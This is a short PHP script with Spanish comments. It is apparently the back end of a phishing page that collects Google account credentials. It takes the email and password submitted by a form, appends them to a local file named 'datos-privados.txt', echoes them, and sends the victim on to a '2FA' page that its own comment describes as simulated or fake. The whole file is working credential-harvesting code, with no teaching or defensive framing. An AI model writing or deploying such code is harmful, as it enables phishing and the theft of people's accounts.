<?php
$file = 'datos-privados.txt';

$email = $_POST['email_google'] ?? 'desconocido';
$password = $_POST['password_google'] ?? 'desconocida';

$log = "[📩] Correo (Google): $email\n[🔑] Contraseña: $password\n\n";
file_put_contents($file, $log, FILE_APPEND);

// Mostrarlo si estás viendo desde terminal
echo $log;

// Redirige a siguiente pantalla (simulación 2FA o falsa)
header("Refresh:0; url=http://192.168.1.1/portal_2fa/index.php");
exit();
?>
